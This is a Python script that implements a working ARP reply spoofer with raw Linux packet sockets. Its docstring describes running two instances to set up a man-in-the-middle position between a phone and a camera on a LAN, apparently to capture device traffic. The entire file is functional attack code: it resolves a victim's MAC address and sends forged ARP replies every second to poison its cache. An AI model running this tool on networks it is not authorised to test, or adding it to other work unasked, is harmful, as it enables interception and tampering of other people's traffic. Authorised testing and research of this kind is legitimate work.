#!/usr/bin/env python3
"""
Minimal ARP reply spoofer (stdlib only). Replaces arpspoof/dsniff for LAN capture.

Usage:
  sudo python3 scripts/arp-spoof.py -i eth0 -t TARGET_IP HOST_IP

Tells TARGET that HOST_IP belongs to this machine's MAC (repeat every second).
Run two instances (or use capture-lan-mitm.sh) for phone <-> camera MITM.
"""

from __future__ import annotations

import argparse
import binascii
import socket
import struct
import sys
import time


def mac_to_bytes(mac: str) -> bytes:
    return binascii.unhexlify(mac.replace(":", ""))


def ip_to_bytes(ip: str) -> bytes:
    return socket.inet_aton(ip)


def read_mac(iface: str) -> bytes:
    with open(f"/sys/class/net/{iface}/address") as fh:
        return mac_to_bytes(fh.read().strip())


def build_arp_reply(
    our_mac: bytes,
    spoof_ip: bytes,
    target_mac: bytes,
    target_ip: bytes,
) -> bytes:
    # Ethernet II header + ARP reply (operation 2)
    eth = struct.pack(
        "!6s6sH",
        target_mac,
        our_mac,
        0x0806,
    )
    arp = struct.pack(
        "!HHBBH6s4s6s4s",
        1,  # hardware type Ethernet
        0x0800,  # IPv4
        6,
        4,
        2,  # reply
        our_mac,
        spoof_ip,
        target_mac,
        target_ip,
    )
    return eth + arp


def resolve_mac(iface: str, ip: str, timeout: float = 3.0) -> bytes:
    """Resolve MAC from kernel ARP table, or send ARP request on the interface."""
    # Try existing neighbour cache first (no extra packets)
    try:
        with open("/proc/net/arp") as fh:
            next(fh)
            for line in fh:
                parts = line.split()
                if len(parts) >= 6 and parts[0] == ip and parts[5] == iface:
                    mac = parts[3]
                    if mac != "00:00:00:00:00:00":
                        return mac_to_bytes(mac)
    except OSError:
        pass

    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
    sock.bind((iface, 0))
    sock.settimeout(0.5)

    our_mac = read_mac(iface)
    target_ip_b = ip_to_bytes(ip)
    zero_mac = b"\x00" * 6
    broadcast = b"\xff" * 6

    # Read our IPv4 on this interface for a valid ARP request
    our_ip_b = ip_to_bytes("0.0.0.0")
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect((ip, 1))
            our_ip_b = ip_to_bytes(s.getsockname()[0])
    except OSError:
        pass

    eth = struct.pack("!6s6sH", broadcast, our_mac, 0x0806)
    arp = struct.pack(
        "!HHBBH6s4s6s4s",
        1,
        0x0800,
        6,
        4,
        1,
        our_mac,
        our_ip_b,
        zero_mac,
        target_ip_b,
    )
    sock.send(eth + arp)

    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            packet = sock.recv(2048)
        except socket.timeout:
            continue
        if len(packet) < 42:
            continue
        eth_type = struct.unpack("!H", packet[12:14])[0]
        if eth_type != 0x0806:
            continue
        arp_data = packet[14:]
        if len(arp_data) < 28:
            continue
        op = struct.unpack("!H", arp_data[6:8])[0]
        if op not in (1, 2):
            continue
        sender_mac = arp_data[8:14]
        sender_ip = arp_data[14:18]
        if sender_ip == target_ip_b:
            sock.close()
            return sender_mac

    sock.close()
    raise RuntimeError(
        f"Could not resolve MAC for {ip} on {iface}. "
        f"Ping the host first or check: cat /proc/net/arp"
    )


def main() -> int:
    parser = argparse.ArgumentParser(description="ARP reply spoofer (stdlib only)")
    parser.add_argument("-i", "--interface", required=True, help="Network interface")
    parser.add_argument("-t", "--target", required=True, help="IP of host to poison")
    parser.add_argument("host", help="IP to pretend to be (at our MAC)")
    parser.add_argument(
        "-r", "--rate", type=float, default=1.0, help="Seconds between replies"
    )
    args = parser.parse_args()

    if sys.platform != "linux":
        print("Linux only (uses AF_PACKET)", file=sys.stderr)
        return 1

    try:
        our_mac = read_mac(args.interface)
        target_ip = ip_to_bytes(args.target)
        spoof_ip = ip_to_bytes(args.host)
        target_mac = resolve_mac(args.interface, args.target)
    except OSError as exc:
        print(f"Error: {exc}", file=sys.stderr)
        return 1

    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
    sock.bind((args.interface, 0))

    print(
        f"ARP spoof on {args.interface}: telling {args.target} "
        f"that {args.host} is at {our_mac.hex(':')}",
        flush=True,
    )

    try:
        while True:
            packet = build_arp_reply(our_mac, spoof_ip, target_mac, target_ip)
            sock.send(packet)
            time.sleep(args.rate)
    except KeyboardInterrupt:
        print("\nStopped.", flush=True)
        return 0


if __name__ == "__main__":
    sys.exit(main())
